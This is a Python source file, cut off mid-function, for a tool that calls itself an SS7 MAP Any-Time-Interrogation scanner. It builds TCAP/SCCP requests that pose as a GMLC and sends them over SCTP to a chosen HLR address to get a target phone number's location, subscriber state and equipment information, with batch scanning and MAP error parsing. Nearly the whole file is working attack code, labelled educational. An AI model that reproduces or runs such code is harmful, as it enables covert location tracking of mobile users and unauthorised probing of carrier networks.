#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
MAP-ATI Scanner Official v4.1 - Complete Final Version
=====================================================
Author: donex1888
Date: 2025-06-05 01:14:23 UTC
Status: Production Ready - Complete with all verified fixes
Description: Advanced MAP Any-Time-Interrogation scanner with integrated working method
License: Educational/Research Use Only

Features:
- Verified working ATI construction method (deepcopy approach)
- Multi-threading batch scanning
- Advanced response analysis with MAP error detection
- SCCP wrapper with proper addressing
- CSV/JSON export capabilities
- Real-time progress monitoring
- Comprehensive logging system
"""

import socket
import struct
import os
import sys
import time
import random
import logging
import threading
import argparse
import json
import csv
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Optional, List, Dict, Tuple, Any, Union
import ipaddress
from copy import deepcopy

# ================================
# VERSION INFORMATION & CONSTANTS
# ================================

VERSION = "4.1"
BUILD_DATE = "2025-06-05 01:14:23 UTC"
AUTHOR = "donex1888"
STATUS = "Production Ready - Complete with all verified fixes"

# Enhanced Colors for Professional Output
class Colors:
    # Reset
    RESET = '\033[0m'
    
    # Styles
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    
    # Standard Colors
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    
    # Bright Colors
    BRIGHT_BLACK = '\033[90m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'
    
    # Background Colors
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'
    BG_BRIGHT_BLACK = '\033[100m'
    BG_BRIGHT_RED = '\033[101m'
    BG_BRIGHT_GREEN = '\033[102m'
    BG_BRIGHT_YELLOW = '\033[103m'
    BG_BRIGHT_BLUE = '\033[104m'
    BG_BRIGHT_MAGENTA = '\033[105m'
    BG_BRIGHT_CYAN = '\033[106m'
    BG_BRIGHT_WHITE = '\033[107m'

def print_colored(msg: str, color: str = Colors.RESET, bold: bool = False, 
                 bg_color: str = "", end: str = "\n") -> None:
    """Enhanced colored printing with background support"""
    style = ""
    if bold:
        style += Colors.BOLD
    if bg_color:
        style += bg_color
    style += color
    
    print(f"{style}{msg}{Colors.RESET}", end=end)

def print_banner():
    """Print professional banner with complete information"""
    banner_width = 90
    
    banner_lines = [
        "=" * banner_width,
        "🎯 MAP-ATI SCANNER OFFICIAL v4.1 - COMPLETE FINAL VERSION",
        f"📅 Build Date: {BUILD_DATE}",
        f"👤 Author: {AUTHOR}",
        f"🏗️ Status: {STATUS}",
        "🔧 Features: Multi-threading, Batch scanning, Advanced analysis, Verified working method",
        "📋 Protocols: TCAP, SCCP, MAP, SIGTRAN with integrated fixes",
        "🎯 Capabilities: Single/Batch/Range scanning, Real-time monitoring, Export",
        "⚠️  License: Educational/Research Use Only",
        "=" * banner_width
    ]
    
    for i, line in enumerate(banner_lines):
        if i == 0 or i == len(banner_lines) - 1:
            print_colored(line, Colors.BRIGHT_CYAN, bold=True)
        elif i == 1:
            print_colored(line, Colors.BRIGHT_GREEN, bold=True)
        elif "Status:" in line:
            print_colored(line, Colors.BRIGHT_YELLOW, bold=True)
        elif "Features:" in line or "Protocols:" in line or "Capabilities:" in line:
            print_colored(line, Colors.CYAN)
        else:
            print_colored(line, Colors.WHITE)

# MAP Protocol Constants
class MapOperations:
    """MAP Operation Codes"""
    UPDATE_LOCATION = 2
    CANCEL_LOCATION = 3
    PURGE_MS = 67
    SEND_IDENTIFICATION = 55
    UPDATE_GPRS_LOCATION = 23
    PROVIDE_SUBSCRIBER_INFO = 70
    ANY_TIME_INTERROGATION = 71
    ANY_TIME_SUBSCRIPTION_INTERROGATION = 62
    NOTE_SUBSCRIBER_DATA_MODIFIED = 5

class SSN:
    """SubSystem Numbers"""
    HLR = 149
    VLR = 150
    MSC = 151
    SGSN = 152
    GGSN = 153
    CAP = 146
    GMLC = 147
    PCAP = 148

class AtiVariant(Enum):
    """ATI Request Variants"""
    BASIC = "basic"
    LOCATION_ONLY = "location_only"
    SUBSCRIBER_STATE = "subscriber_state"
    EQUIPMENT_INFO = "equipment_info"
    ALL_INFO = "all_info"
    MINIMAL = "minimal"

class ScanResult(Enum):
    """Scan Result Types"""
    SUCCESS = "success"
    TIMEOUT = "timeout"
    CONNECTION_REFUSED = "connection_refused"
    NETWORK_ERROR = "network_error"
    PROTOCOL_ERROR = "protocol_error"
    MAP_ERROR = "map_error"
    BUILD_ERROR = "build_error"
    UNKNOWN_ERROR = "unknown_error"

# Data Structures
@dataclass
class TargetInfo:
    """Target information structure"""
    ip: str
    port: int
    msisdn: str
    description: str = ""
    
    def __str__(self):
        return f"{self.ip}:{self.port} -> {self.msisdn}"

@dataclass
class ScanResultData:
    """Complete scan result data structure"""
    target: TargetInfo
    result: ScanResult
    response_time_ms: float
    response_data: Optional[bytes]
    response_hex: str
    error_message: str
    map_error_code: Optional[int]
    map_error_message: str
    tcap_type: str
    otid: str
    invoke_id: Optional[int]
    timestamp: str
    ati_variant: str
    message_size: int
    additional_info: Dict[str, Any]

# ================================
# DEPENDENCY LOADING WITH ERROR HANDLING
# ================================

print_banner()
print_colored("🔧 Loading and verifying required modules...", Colors.YELLOW, bold=True)

# Global module variables
PYCRATE_AVAILABLE = False
MAP_MODULE = None
MAP_MS = None
TCAP_MSGS = None
SCCP_MODULE = None
SCTP_AVAILABLE = False

# Load pycrate modules with detailed verification
try:
    print_colored("📦 Loading pycrate ASN.1 modules...", Colors.CYAN)
    
    # Load MAP from TCAP_MAPv2v3 (verified working path)
    from pycrate_asn1dir import TCAP_MAPv2v3
    MAP_MODULE = TCAP_MAPv2v3
    MAP_MS = MAP_MODULE.MAP_MS_DataTypes
    print_colored("  ✅ TCAP_MAPv2v3 loaded successfully", Colors.GREEN)
    
    # Verify AnyTimeInterrogationArg availability
    if hasattr(MAP_MS, 'AnyTimeInterrogationArg'):
        print_colored("  ✅ AnyTimeInterrogationArg verified", Colors.GREEN)
    else:
        raise ImportError("AnyTimeInterrogationArg not found in MAP_MS_DataTypes")
    
    # Load TCAP from TCAP2 (verified working path)
    from pycrate_asn1dir import TCAP2
    TCAP_MSGS = TCAP2.TCAPMessages
    print_colored("  ✅ TCAP2 loaded successfully", Colors.GREEN)
    
    # Verify TCAP components
    required_tcap = ['Invoke', 'Component', 'Begin', 'TCMessage']
    for component in required_tcap:
        if hasattr(TCAP_MSGS, component):
            print_colored(f"  ✅ {component} verified", Colors.GREEN)
        else:
            raise ImportError(f"{component} not found in TCAPMessages")
    
    # Load SCCP
    from pycrate_mobile import SCCP
    SCCP_MODULE = SCCP
    print_colored("  ✅ SCCP loaded successfully", Colors.GREEN)
    
    PYCRATE_AVAILABLE = True
    print_colored("✅ All pycrate modules loaded and verified", Colors.BRIGHT_GREEN, bold=True)
    
except ImportError as e:
    print_colored(f"❌ Pycrate import failed: {e}", Colors.RED, bold=True)
    print_colored("📋 Install with: pip install pycrate pycrate-asn1rt pycrate-asn1dir pycrate-mobile", Colors.YELLOW)
    PYCRATE_AVAILABLE = False

# Load SCTP with verification
try:
    print_colored("📦 Loading SCTP support...", Colors.CYAN)
    import sctp
    
    # Verify SCTP socket creation
    test_sock = sctp.sctpsocket_tcp(socket.AF_INET)
    test_sock.close()
    
    SCTP_AVAILABLE = True
    print_colored("✅ SCTP support loaded and verified", Colors.GREEN, bold=True)
    
except ImportError:
    print_colored("❌ SCTP support not available", Colors.RED, bold=True)
    print_colored("📋 Install with: pip install pysctp", Colors.YELLOW)
    SCTP_AVAILABLE = False
except Exception as e:
    print_colored(f"❌ SCTP verification failed: {e}", Colors.RED, bold=True)
    SCTP_AVAILABLE = False

print_colored("-" * 90, Colors.CYAN)

# Dependency check
if not PYCRATE_AVAILABLE or not SCTP_AVAILABLE:
    print_colored("❌ Critical dependencies missing. Cannot continue.", Colors.RED, bold=True)
    sys.exit(1)

print_colored("🎉 All dependencies verified successfully!", Colors.BRIGHT_GREEN, bold=True)

# ================================
# ENHANCED LOGGING SYSTEM
# ================================

class CustomFormatter(logging.Formatter):
    """Custom formatter with colors and enhanced formatting"""
    
    FORMATS = {
        logging.DEBUG: Colors.DIM + "%(asctime)s [DBG] %(name)s: %(message)s" + Colors.RESET,
        logging.INFO: Colors.WHITE + "%(asctime)s [INF] %(name)s: %(message)s" + Colors.RESET,
        logging.WARNING: Colors.YELLOW + "%(asctime)s [WRN] %(name)s: %(message)s" + Colors.RESET,
        logging.ERROR: Colors.RED + "%(asctime)s [ERR] %(name)s: %(message)s" + Colors.RESET,
        logging.CRITICAL: Colors.BRIGHT_RED + Colors.BOLD + "%(asctime)s [CRT] %(name)s: %(message)s" + Colors.RESET
    }
    
    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno, self.FORMATS[logging.INFO])
        formatter = logging.Formatter(log_fmt, datefmt='%H:%M:%S')
        return formatter.format(record)

def setup_logging(level: str = "INFO", log_file: Optional[str] = None) -> logging.Logger:
    """Setup enhanced logging with file and console handlers"""
    logger = logging.getLogger('MAP_ATI_Scanner')
    logger.setLevel(getattr(logging, level.upper()))
    
    # Clear existing handlers
    logger.handlers.clear()
    
    # Console handler with colors
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(CustomFormatter())
    logger.addHandler(console_handler)
    
    # File handler if specified
    if log_file:
        file_handler = logging.FileHandler(log_file)
        file_handler.setFormatter(logging.Formatter(
            '%(asctime)s [%(levelname)s] %(name)s: %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        ))
        logger.addHandler(file_handler)
        logger.info(f"Logging to file: {log_file}")
    
    return logger

# Initialize logger
logger = setup_logging()

# ================================
# CORE PROTOCOL FUNCTIONS (VERIFIED WORKING METHOD)
# ================================

def format_msisdn_enhanced(msisdn: str, nai_byte: int = 0x91) -> bytes:
    """Enhanced MSISDN formatting with BCD encoding - VERIFIED WORKING"""
    if not msisdn:
        raise ValueError("MSISDN cannot be empty")
    
    # Clean MSISDN - remove all non-digit characters
    digits = ''.join(c for c in msisdn if c.isdigit())
    
    if not digits:
        raise ValueError("MSISDN must contain digits")
    
    # Validate length (E.164 standard: 7-15 digits)
    if len(digits) < 7 or len(digits) > 15:
        logger.warning(f"MSISDN length unusual: {len(digits)} digits")
    
    # BCD encoding with proper nibble swapping
    if len(digits) % 2:
        digits += "F"  # Padding for odd length
    
    bcd_bytes = bytearray([nai_byte])  # Nature of Address (0x91 = International)
    
    for i in range(0, len(digits), 2):
        # BCD encoding: swap nibbles (ITU-T Q.713)
        digit1 = int(digits[i])
        digit2 = int(digits[i+1]) if digits[i+1] != 'F' else 0xF
        
        # Pack as: high_nibble = digit2, low_nibble = digit1
        bcd_bytes.append((digit2 << 4) | digit1)
    
    return bytes(bcd_bytes)

def build_ati_pdu_verified(target_msisdn: str, ati_variant: AtiVariant = AtiVariant.BASIC,
                          cgpa_gt: str = "212600000001", unique_id: str = "") -> Tuple[Optional[bytes], Optional[str], Optional[int]]:
    """Build ATI PDU using verified working method - COMPLETE WITH ALL FIXES"""
    
    if not PYCRATE_AVAILABLE or not MAP_MS or not TCAP_MSGS:
        logger.error(f"[{unique_id}] Required modules not available")
        return None, None, None
    
    try:
        logger.debug(f"[{unique_id}] Building verified ATI PDU for {target_msisdn} (variant: {ati_variant.value})")
        
        # Create ATI instance using verified working method (deepcopy)
        ati_arg = deepcopy(MAP_MS.AnyTimeInterrogationArg)
        
        if ati_arg is None:
            logger.error(f"[{unique_id}] Failed to create ATI instance - deepcopy returned None")
            return None, None, None
        
        # Encode MSISDNs with enhanced validation
        try:
            target_msisdn_bytes = format_msisdn_enhanced(target_msisdn)
            scf_msisdn_bytes = format_msisdn_enhanced(cgpa_gt)
        except ValueError as e:
            logger.error(f"[{unique_id}] MSISDN encoding failed: {e}")
            return None, None, None
        
        logger.debug(f"[{unique_id}] Target MSISDN encoded: {target_msisdn_bytes.hex()}")
        logger.debug(f"[{unique_id}] SCF MSISDN encoded: {scf_msisdn_bytes.hex()}")
        
        # Build RequestedInfo based on ATI variant
        requested_info_dict = {}
        
        if ati_variant == AtiVariant.LOCATION_ONLY:
            requested_info_dict = {'locationInformation': None}
        elif ati_variant == AtiVariant.SUBSCRIBER_STATE:
            requested_info_dict = {'subscriberState': None}
        elif ati_variant == AtiVariant.EQUIPMENT_INFO:
            requested_info_dict = {'equipmentStatus': None}
        elif ati_variant == AtiVariant.ALL_INFO:
            requested_info_dict = {
                'locationInformation': None,
                'subscriberState': None,
                'equipmentStatus': None
            }
        elif ati_variant == AtiVariant.MINIMAL:
            requested_info_dict = {}
        else:  # BASIC
            requested_info_dict = {'locationInformation': None}
        
        # Build complete ATI arguments with all mandatory fields
        ati_complete = {
            # Mandatory field 1: subscriberIdentity
            'subscriberIdentity': ('msisdn', target_msisdn_bytes),
            
            # Mandatory field 2: requestedInfo
            'requestedInfo': requested_info_dict,
            
            # Mandatory field 3: gsmSCF-Address
            'gsmSCF-Address': scf_msisdn_bytes
        }
        
        # Set ATI arguments with multiple fallback methods
        success = False
        method_used = ""
        
        # Method 1: Direct complete setting
        try:
            ati_arg.set_val(ati_complete)
            success = True
            method_used = "direct_complete"
            logger.debug(f"[{unique_id}] ATI values set using direct complete method")
        except Exception as e1:
            logger.debug(f"[{unique_id}] Direct complete method failed: {e1}")
            
            # Method 2: Try with empty requestedInfo
            try:
                ati_fallback = {
                    'subscriberIdentity': ('msisdn', target_msisdn_bytes),
                    'requestedInfo': {},
                    'gsmSCF-Address': scf_msisdn_bytes
                }
                ati_arg.set_val(ati_fallback)
                success = True
                method_used = "empty_requested_info"
                logger.debug(f"[{unique_id}] ATI fallback method (empty requestedInfo) successful")
            except Exception as e2:
                logger.debug(f"[{unique_id}] Empty requestedInfo method failed: {e2}")
                
                # Method 3: Try minimal (only mandatory subscriber identity)
                try:
                    ati_minimal = {
                        'subscriberIdentity': ('msisdn', target_msisdn_bytes),
                        'gsmSCF-Address': scf_msisdn_bytes
                    }
                    ati_arg.set_val(ati_minimal)
                    success = True
                    method_used = "minimal_mandatory"
                    logger.debug(f"[{unique_id}] ATI minimal method successful")
                except Exception as e3:
                    logger.error(f"[{unique_id}] All ATI construction methods failed: {e1}, {e2}, {e3}")
                    return None, None, None
        
        if not success:
            logger.error(f"[{unique_id}] Failed to set ATI arguments")
            return None, None, None
        
        # Convert to BER with error handling
        try:
            param_ber = ati_arg.to_ber()
        except Exception as e:
            logger.error(f"[{unique_id}] ATI BER conversion failed: {e}")
            return None, None, None
        
        logger.debug(f"[{unique_id}] MAP parameter: {len(param_ber)} bytes (method: {method_used})")
        
        # Build TCAP Invoke
        try:
            invoke = deepcopy(TCAP_MSGS.Invoke)
            invoke_id = random.randint(1, 127)
            
            invoke.set_val({
                'invokeID': invoke_id,
                'opCode': ('localValue', MapOperations.ANY_TIME_INTERROGATION)
            })
            
            # Set parameter with fallback methods
            param_set = False
            try:
                invoke._cont['parameter'].from_ber(param_ber)
                param_set = True
                logger.debug(f"[{unique_id}] Parameter set via from_ber")
            except Exception as pe1:
                try:
                    invoke._cont['parameter']._val = param_ber
                    param_set = True
                    logger.debug(f"[{unique_id}] Parameter set via _val")
                except Exception as pe2:
                    logger.error(f"[{unique_id}] Parameter setting failed: {pe1}, {pe2}")
                    return None, None, None
            
            if not param_set:
                return None, None, None
                
        except Exception as e:
            logger.error(f"[{unique_id}] TCAP Invoke creation failed: {e}")
            return None, None, None
        
        # Build Component
        try:
            component = deepcopy(TCAP_MSGS.Component)
            component.set_val(('invoke', invoke.get_val()))
        except Exception as e:
            logger.error(f"[{unique_id}] TCAP Component creation failed: {e}")
            return None, None, None
        
        # Build Begin
        try:
            begin = deepcopy(TCAP_MSGS.Begin)
            otid = os.urandom(4)
            
            begin.set_val({
                'otid': otid,
                'components': [component.get_val()]
            })
        except Exception as e:
            logger.error(f"[{unique_id}] TCAP Begin creation failed: {e}")
            return None, None, None
        
        # Build TC Message
        try:
            tc_msg = deepcopy(TCAP_MSGS.TCMessage)
            tc_msg.set_val(('begin', begin.get_val()))
            
            tcap_bytes = tc_msg.to_ber()
        except Exception as e:
            logger.error(f"[{unique_id}] TCAP Message creation failed: {e}")
            return None, None, None
        
        otid_hex = otid.hex()
        
        logger.debug(f"[{unique_id}] TCAP built successfully: {len(tcap_bytes)} bytes, OTID: {otid_hex}, InvokeID: {invoke_id}")
        logger.debug(f"[{unique_id}] TCAP hex: {tcap_bytes.hex()}")
        
        return tcap_bytes, otid_hex, invoke_id
        
    except Exception as e:
        logger.error(f"[{unique_id}] Verified ATI build error: {e}")
        import traceback
        logger.debug(f"[{unique_id}] Full traceback: {traceback.format_exc()}")
        return None, None, None

def build_sccp_wrapper_enhanced(tcap_data: bytes, target_msisdn: str, 
                               cgpa_gt: str = "212600000001", unique_id: str = "") -> bytes:
    """Build enhanced SCCP wrapper around TCAP - VERIFIED WORKING"""
    
    if not SCCP_MODULE or not tcap_data:
        logger.warning(f"[{unique_id}] SCCP not available or no TCAP data, returning raw TCAP")
        return tcap_data
    
    try:
        logger.debug(f"[{unique_id}] Building enhanced SCCP wrapper")
        
        sccp_udt = SCCP_MODULE.SCCPUnitData()
        
        # Build Called Party Address (HLR) with complete addressing
        cdpa = SCCP_MODULE._SCCPAddr()
        cdpa['AddrInd']['res'].set_val(0)
        cdpa['AddrInd']['RoutingInd'].set_val(1)  # Route on SSN + GT
        cdpa['AddrInd']['GTInd'].set_val(4)       # GT format 4 (NAI + NP + ES + Digits)
        cdpa['AddrInd']['SSNInd'].set_val(1)      # SSN present
        cdpa['AddrInd']['PCInd'].set_val(0)       # PC not present
        cdpa['SSN'].set_val(SSN.HLR)              # HLR SSN (149)
        
        # Set Global Title for Called Party
        gt4_cdpa = cdpa['GT'].get_alt()
        gt4_cdpa['TranslationType'].set_val(0)    # No translation
        gt4_cdpa['NumberingPlan'].set_val(1)      # E.164 numbering plan
        gt4_cdpa['EncodingScheme'].set_val(1)     # BCD, odd number of digits
        gt4_cdpa['spare'].set_val(0)
        gt4_cdpa['NAI'].set_val(4)                # International number
        gt4_cdpa.set_addr_bcd(target_msisdn)
        
        # Build Calling Party Address (GMLC) with complete addressing
        cgpa = SCCP_MODULE._SCCPAddr()
        cgpa['AddrInd']['res'].set_val(0)
        cgpa['AddrInd']['RoutingInd'].set_val(1)  # Route on SSN + GT
        cgpa['AddrInd']['GTInd'].set_val(4)       # GT format 4
        cgpa['AddrInd']['SSNInd'].set_val(1)      # SSN present
        cgpa['AddrInd']['PCInd'].set_val(0)       # PC not present
        cgpa['SSN'].set_val(SSN.GMLC)             # GMLC SSN (147)
        
        # Set Global Title for Calling Party
        gt4_cgpa = cgpa['GT'].get_alt()
        gt4_cgpa['TranslationType'].set_val(0)
        gt4_cgpa['NumberingPlan'].set_val(1)
        gt4_cgpa['EncodingScheme'].set_val(1)
        gt4_cgpa['spare'].set_val(0)
        gt4_cgpa['NAI'].set_val(4)
        gt4_cgpa.set_addr_bcd(cgpa_gt)
        
        # Build SCCP UDT with complete addressing
        sccp_udt.set_val({
            'Type': 9,  # UDT (Unitdata)
            'ProtocolClass': {
                'Handling': 0,  # No special handling
                'Class': 0      # Class 0 (connectionless)
            },
            'Pointers': {'Ptr0': 0, 'Ptr1': 0, 'Ptr2': 0},  # Will be calculated
            'CalledPartyAddr': {'Len': 0, 'Value': cdpa.get_val()},
            'CallingPartyAddr': {'Len': 0, 'Value': cgpa.get_val()},
            'Data': {'Len': len(tcap_data), 'Value': tcap_data}
        })
        
        sccp_bytes = sccp_udt.to_bytes()
        
        logger.debug(f"[{unique_id}] SCCP wrapper built successfully: {len(sccp_bytes)} bytes")
        logger.debug(f"[{unique_id}] SCCP addresses: CDPA(HLR)={target_msisdn}, CGPA(GMLC)={cgpa_gt}")
        
        return sccp_bytes
        
    except Exception as e:
        logger.error(f"[{unique_id}] SCCP wrapper error: {e}")
        logger.debug(f"[{unique_id}] Returning raw TCAP data")
        return tcap_data

# ================================
# NETWORK OPERATIONS & SCANNING
# ================================

def send_ati_request_complete(target: TargetInfo, ati_variant: AtiVariant = AtiVariant.BASIC,
                             cgpa_gt: str = "212600000001", timeout: int = 10) -> ScanResultData:
    """Send ATI request using complete verified method with comprehensive result analysis"""
    
    unique_id = f"{target.ip}:{target.port}_{target.msisdn}_{int(time.time())}"
    start_time = time.time()
    
    # Initialize result structure
    result_data = ScanResultData(
        target=target,
        result=ScanResult.UNKNOWN_ERROR,
        response_time_ms=0.0,
        response_data=None,
        response_hex="",
        error_message="",
        map_error_code=None,
        map_error_message="",
        tcap_type="",
        otid="",
        invoke_id=None,
        timestamp=datetime.now(timezone.utc).isoformat(),
        ati_variant=ati_variant.value,
        message_size=0,
        additional_info={}
    )
    
    try:
        logger.info(f"[{unique_id}] Starting complete ATI scan: {target}")
        
        # Build ATI PDU using verified working method
        tcap_data, otid_hex, invoke_id = build_ati_pdu_verified(
            target.msisdn, ati_variant, cgpa_gt, unique_id
        )
        
        if not tcap_data:
            result_data.result = ScanResult.BUILD_ERROR
            result_data.error_message = "Failed to build ATI PDU"
            logger.error(f"[{unique_id}] ATI PDU build failed")
            return result_data
        
        result_data.otid = otid_hex or ""
        result_data.invoke_id = invoke_id
        
        # Build SCCP wrapper using enhanced method
        final_data = build_sccp_wrapper_enhanced(tcap_data, target.msisdn, cgpa_gt, unique_id)
        result_data.message_size = len(final_data)
        
        logger.debug(f"[{unique_id}] Final message built: {len(final_data)} bytes")
        
        # Send via SCTP with comprehensive error handling
        sock = None
        try:
            sock = sctp.sctpsocket_tcp(socket.AF_INET)
            sock.settimeout(timeout)
            
            # Connect with timing
            connect_start = time.time()
            sock.connect((target.ip, target.port))
            connect_time = (time.time() - connect_start) * 1000
            
            logger.debug(f"[{unique_id}] Connected to {target.ip}:{target.port} in {connect_time:.1f}ms")
            
            # Send data
            sent = sock.sctp_send(final_data, ppid=0)
            
            if sent <= 0:
                result_data.result = ScanResult.NETWORK_ERROR
                result_data.error_message = f"Failed to send data (sent: {sent} bytes)"
                return result_data
            
            logger.debug(f"[{unique_id}] Sent {sent}/{len(final_data)} bytes")
            
            # Receive response with timeout handling
            try:
                response = sock.recv(4096)
                response_time = (time.time() - start_time) * 1000
                result_data.response_time_ms = response_time
                
            except socket.timeout:
                result_data.result = ScanResult.TIMEOUT
                result_data.error_message = "Response timeout"
                result_data.response_time_ms = timeout * 1000
                logger.warning(f"[{unique_id}] Response timeout after {timeout}s")
                return result_data
            
        finally:
            if sock:
                sock.close()
        
        # Analyze response with comprehensive protocol analysis
        if response and len(response) > 0:
            result_data.response_data = response
            result_data.response_hex = response.hex()
            
            logger.info(f"[{unique_id}] Response received: {len(response)} bytes in {response_time:.1f}ms")
            logger.debug(f"[{unique_id}] Response hex: {response.hex()}")
            
            # Advanced protocol analysis
            analyze_protocol_response(response, result_data, unique_id)
            
            # If no specific error found, mark as success
            if result_data.result == ScanResult.UNKNOWN_ERROR:
                result_data.result = ScanResult.SUCCESS
                
        else:
            result_data.result = ScanResult.TIMEOUT
            result_data.error_message = "No response data received"
            result_data.response_time_ms = timeout * 1000
            logger.warning(f"[{unique_id}] No response data received")
        
        return result_data
        
    except socket.timeout:
        result_data.result = ScanResult.TIMEOUT
        result_data.error_message = "Connection timeout"
        result_data.response_time_ms = timeout * 1000
        logger.warning(f"[{unique_id}] Connection timeout")
        
    except ConnectionRefusedError:
        result_data.result = ScanResult.CONNECTION_REFUSED
        result_data.error_message = "Connection refused"
        result_data.response_time_ms = (time.time() - start_time) * 1000
        logger.warning(f"[{unique_id}] Connection refused")
        
    except OSError as e:
        result_data.result = ScanResult.NETWORK_ERROR
        result_data.error_message = f"Network error: {str(e)}"
        result_data.response_time_ms = (time.time() - start_time) * 1000
        logger.error(f"[{unique_id}] Network error: {e}")
        
    except Exception as e:
        result_data.result = ScanResult.UNKNOWN_ERROR
        result_data.error_message = f"Unexpected error: {str(e)}"
        result_data.response_time_ms = (time.time() - start_time) * 1000
        logger.error(f"[{unique_id}] Unexpected error: {e}")
    
    return result_data

def analyze_protocol_response(response: bytes, result_data: ScanResultData, unique_id: str):
    """Comprehensive protocol response analysis"""
    
    try:
        if len(response) == 0:
            return
        
        first_byte = response[0]
        
        # SCCP Analysis
        if first_byte == 0x09:  # SCCP UDT
            result_data.tcap_type = "SCCP_UDT"
            result_data.additional_info['sccp_type'] = 'UDT'
            logger.debug(f"[{unique_id}] SCCP UDT detected")
            
            # Look for TCAP inside SCCP
            tcap_found = False
            for i in range(len(response)):
                if i < len(response) - 1:
                    byte_val = response[i]
                    if byte_val == 0x65:  # TCAP End
                        result_data.tcap_type = "TCAP_End"
                        result_data.result = ScanResult.SUCCESS
                        tcap_found = True
                        logger.debug(f"[{unique_id}] TCAP End found at offset {i}")
                        break
                    elif byte_val == 0x67:  # TCAP Abort
                        result_data.tcap_type = "TCAP_Abort"
                        result_data.result = ScanResult.PROTOCOL_ERROR
                        tcap_found = True
                        logger.debug(f"[{unique_id}] TCAP Abort found at offset {i}")
                        # Look for abort reason
                        if i + 2 < len(response):
                            abort_reason = response[i + 2]
                            result_data.additional_info['abort_reason'] = f"0x{abort_reason:02x}"
                        break
                    elif byte_val == 0x64:  # TCAP Continue
                        result_data.tcap_type = "TCAP_Continue"
                        result_data.result = ScanResult.SUCCESS
                        tcap_found = True
                        logger.debug(f"[{unique_id}] TCAP Continue found at offset {i}")
                        break
            
            if not tcap_found:
                result_data.additional_info['sccp_only'] = True
                
        # Direct TCAP Analysis
        elif first_byte in [0x64, 0x65, 0x67]:
            tcap_types = {0x64: 'TCAP_Continue', 0x65: 'TCAP_End', 0x67: 'TCAP_Abort'}
            result_data.tcap_type = tcap_types[first_byte]
            result_data.result = ScanResult.SUCCESS if first_byte in [0x64, 0x65] else ScanResult.PROTOCOL_ERROR
            result_data.additional_info['direct_tcap'] = True
            logger.debug(f"[{unique_id}] Direct TCAP {tcap_types[first_byte]} detected")
            
        else:
            result_data.tcap_type = f"Unknown_0x{first_byte:02x}"
            result_data.result = ScanResult.PROTOCOL_ERROR
            result_data.additional_info['unknown_protocol'] = True
            logger.debug(f"[{unique_id}] Unknown protocol type: 0x{first_byte:02x}")
        
        # MAP Error Analysis
        map_error_found = analyze_map_errors(response, result_data, unique_id)
        
        # Additional protocol information extraction
        extract_additional_info(response, result_data, unique_id)
        
    except Exception as e:
        logger.error(f"[{unique_id}] Protocol analysis error: {e}")
        result_data.additional_info['analysis_error'] = str(e)

def analyze_map_errors(response: bytes, result_data: ScanResultData, unique_id: str) -> bool:
    """Analyze MAP errors in response"""
    
    try:
        # Look for MAP error codes (INTEGER encoding: 0x02 0x01 <error_code>)
        for i in range(len(response) - 2):
            if response[i] == 0x02 and response[i+1] == 0x01:  # INTEGER length 1
                error_code = response[i+2]
                
                # MAP Error codes mapping (3GPP TS 29.002)
                map_errors = {
                    1: "Unknown Subscriber",
                    3: "Unknown MSC",
                    5: "Unidentified Subscriber",
                    8: "Unknown Equipment",
                    9: "Roaming Not Allowed",
                    10: "Illegal Subscriber",
                    11: "Bearer Service Not Provisioned",
                    12: "Teleservice Not Provisioned",
                    13: "Illegal Equipment",
                    14: "Call Barred",
                    15: "Forwarding Violation",
                    16: "CUG Reject",
                    17: "Illegal SS Operation",
                    18: "SS Error Status",
                    19: "SS Not Available",
                    20: "SS Subscription Violation",
                    21: "SS Incompatibility",
                    22: "Facility Not Supported",
                    23: "No Handover Number Available",
                    25: "Subsequent Handover Failure",
                    26: "Absent Subscriber SM",
                    27: "Absent Subscriber",
                    28: "Subscriber Busy For MT SMS",
                    29: "SM Delivery Failure",
                    30: "Message Waiting List Full",
                    31: "System Failure",
                    32: "Data Missing",
                    33: "Unexpected Data Value",
                    34: "PW Registration Failure",
                    35: "Negative PW Check",
                    36: "No Roaming Number Available",
                    37: "Tracing Buffer Full",
                    39: "Target Cell Outside Group Call Area",
                    40: "Number Of PW Attempts Violation",
                    41: "Number Changed",
                    42: "Busy Subscriber",
                    43: "No Subscriber Reply",
                    44: "Forwarding Failed",
                    45: "OR Not Allowed",
                    46: "ATI Not Allowed",
                    47: "No Group Call Number Available",
                    48: "Resource Limitation",
                    49: "Unauthorized Requesting Network",
                    50: "Unauthorized LCS Client",
                    51: "Position Method Failure",
                    52: "Unknown Or Unreachable LCS Client",
                    53: "MM Event Not Supported",
                    54: "ATSI Not Allowed",
                    55: "ATM Not Allowed",
                    56: "Information Not Available"
                }
                
                if error_code in map_errors:
                    result_data.map_error_code = error_code
                    result_data.map_error_message = map_errors[error_code]
                    result_data.result = ScanResult.MAP_ERROR
                    result_data.additional_info['map_error_offset'] = i
                    
                    logger.info(f"[{unique_id}] MAP Error detected: {error_code} - {map_errors[error_code]}")
                    return True
                else:
                    logger.debug(f"[{unique_id}] Unknown MAP error code: {error_code}")
                    result_data.additional_info['unknown_map_error'] = error_code
        
        return False
        
    except Exception as e:
        logger.error(f"[{unique_id}] MAP error analysis failed: {e}")
        return False

def extract_additional_info(response: bytes, result_data: ScanResultData, unique_id: str):
    """Extract additional information from response"""
    
    try:
        # Response statistics
        result_data.additional_info.update({
            'response_length': len(response),
